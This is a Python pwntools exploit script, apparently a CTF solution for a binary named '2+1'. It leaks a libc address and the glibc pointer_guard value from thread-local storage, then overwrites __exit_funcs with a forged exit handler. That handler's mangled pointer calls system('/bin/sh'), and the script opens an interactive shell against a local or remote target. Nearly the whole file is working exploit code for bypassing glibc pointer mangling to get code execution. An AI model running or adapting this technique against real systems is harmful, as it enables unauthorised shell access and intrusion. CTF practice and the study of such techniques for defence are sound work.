#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './2+1'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag              :p.info(tag + ': {:#x}'.format(eval(tag)))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def ROL(data,off):
    tmp = bin(data)[2:].rjust(64,'0')
    return int(tmp[off:]+tmp[:off],2)

def ROR(data,off):
    tmp = bin(data)[2:].rjust(64,'0')
    return int(tmp[64-off:]+tmp[:64-off],2)

# get libc base addr
ru('Gift: ')
libcbase = eval(ru('\n')) - libc.sym['alarm']
info_addr('libcbase')

# calc system and binsh addr
system = libcbase + libc.sym['system']
binsh = libcbase + libc.search('/bin/sh').next()

# calc addr of pointer_guard in tls
# local env: ubuntu16.04 libc2.23ubuntu11.2
pointer_guard = 0x5e3730 + libcbase
if is_remote:
    pointer_guard = 0x5ed730 + libcbase
    print 'remote now....'
info_addr('pointer_guard')

# leak pointer_guard
sea('read?:',p64(pointer_guard))
ru('data: ')
pg = u64(rc(8))
info_addr('pg')

# calc addr of __exit_funcs in libc
__exit_funcs = 0x3c45f8 + libcbase
info_addr('__exit_funcs')
# overwrite inital in __exit_funcs
sea('write?:',p64(__exit_funcs))

# fake inital: struct exit_function_list
msg =  p64(0) # *next;
msg += p64(1) # idx;
msg += p64(4) # fns->flavor
msg += p64(ROL(system^pg,0x11)) + p64(binsh) # fns->func

sla('msg: ', msg)

p.interactive()

